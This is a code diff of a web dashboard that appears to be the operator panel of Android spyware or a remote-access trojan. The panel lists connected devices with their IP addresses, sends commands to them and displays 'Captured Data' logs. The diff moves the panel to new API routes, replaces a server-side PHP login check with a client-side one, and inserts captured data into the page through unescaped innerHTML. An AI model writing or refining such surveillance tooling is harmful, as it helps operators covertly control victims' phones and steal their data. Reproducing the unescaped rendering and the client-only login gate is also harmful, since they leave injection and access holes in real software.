@@ -1,11 +1,3 @@
-<?php
-session_start();
-if (!isset($_SESSION['logged_in'])) {
-    header('Location: index.html');
-    exit();
-}
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -142,7 +134,6 @@ if (!isset($_SESSION['logged_in'])) {
     <div class="container">
         <div class="sidebar">
             <button onclick="showDevices()">📱 Devices</button>
-            <button onclick="showCommands()">🎮 Commands</button>
             <button onclick="showLogs()">📊 Logs</button>
             <button onclick="showSettings()">⚙️ Settings</button>
             <button onclick="logout()">🚪 Logout</button>
@@ -154,26 +145,54 @@ if (!isset($_SESSION['logged_in'])) {
     </div>
     
     <script>
+        // ===== التحقق من تسجيل الدخول =====
+        window.onload = function() {
+            checkAuth();
+        };
+        
+        function checkAuth() {
+            fetch('/api/check-auth')
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.logged_in) {
+                        window.location.href = '/';
+                    } else {
+                        showDevices();
+                    }
+                })
+                .catch(() => {
+                    window.location.href = '/';
+                });
+        }
+        
         function showDevices() {
-            fetch('api/devices.php')
+            fetch('/api/devices')
                 .then(response => response.json())
                 .then(data => {
                     let html = '<h2>📱 Connected Devices</h2>';
                     
-                    data.devices.forEach(device => {
-                        html += `
-                            <div class="device-card" onclick="selectDevice('${device.id}')">
-                                <h3 class="${device.online ? 'device-online' : 'device-offline'}">
-                                    ${device.online ? '🟢' : '🔴'} ${device.model}
-                                </h3>
-                                <p>ID: ${device.id}</p>
-                                <p>IP: ${device.ip}</p>
-                                <p>Android: ${device.android_version}</p>
-                            </div>
-                        `;
-                    });
+                    if (data.devices && data.devices.length > 0) {
+                        data.devices.forEach(device => {
+                            html += `
+                                <div class="device-card" onclick="selectDevice('${device.id}')">
+                                    <h3 class="${device.online ? 'device-online' : 'device-offline'}">
+                                        ${device.online ? '🟢' : '🔴'} ${device.model || 'Unknown'}
+                                    </h3>
+                                    <p>ID: ${device.id}</p>
+                                    <p>IP: ${device.ip_address || 'N/A'}</p>
+                                    <p>Android: ${device.android_version || 'N/A'}</p>
+                                </div>
+                            `;
+                        });
+                    } else {
+                        html += '<p>No devices connected</p>';
+                    }
                     
                     document.getElementById('mainContent').innerHTML = html;
+                })
+                .catch(error => {
+                    document.getElementById('mainContent').innerHTML = 
+                        '<p class="device-offline">Failed to load devices</p>';
                 });
         }
         
@@ -208,7 +227,7 @@ if (!isset($_SESSION['logged_in'])) {
         }
         
         function sendCommand(deviceId, command) {
-            fetch('api/commands.php', {
+            fetch('/api/commands', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -220,24 +239,34 @@ if (!isset($_SESSION['logged_in'])) {
             })
             .then(response => response.json())
             .then(data => {
-                document.getElementById('logOutput').innerHTML += `<p>> Command sent: ${command}</p>`;
-                if (data.result) {
-                    document.getElementById('logOutput').innerHTML += `<p>> Result: ${data.result}</p>`;
-                }
+                document.getElementById('logOutput').innerHTML += 
+                    `<p>> Command sent: ${command}</p>`;
+            })
+            .catch(error => {
+                document.getElementById('logOutput').innerHTML += 
+                    `<p class="device-offline">> Failed to send command</p>`;
             });
         }
         
         function showLogs() {
-            fetch('api/data.php')
+            fetch('/api/data')
                 .then(response => response.json())
                 .then(data => {
                     let html = '<h2>📊 Captured Data</h2>';
                     
-                    data.logs.forEach(log => {
-                        html += `<div class="device-card"><p>${log}</p></div>`;
-                    });
+                    if (data.logs && data.logs.length > 0) {
+                        data.logs.forEach(log => {
+                            html += `<div class="device-card"><p>${log}</p></div>`;
+                        });
+                    } else {
+                        html += '<p>No captured data</p>';
+                    }
                     
                     document.getElementById('mainContent').innerHTML = html;
+                })
+                .catch(error => {
+                    document.getElementById('mainContent').innerHTML = 
+                        '<p class="device-offline">Failed to load logs</p>';
                 });
         }
         
@@ -254,7 +283,13 @@ if (!isset($_SESSION['logged_in'])) {
         }
         
         function logout() {
-            window.location.href = 'index.html';
+            fetch('/api/logout', { method: 'POST' })
+                .then(() => {
+                    window.location.href = '/';
+                })
+                .catch(() => {
+                    window.location.href = '/';
+                });
         }
     </script>
 </body>
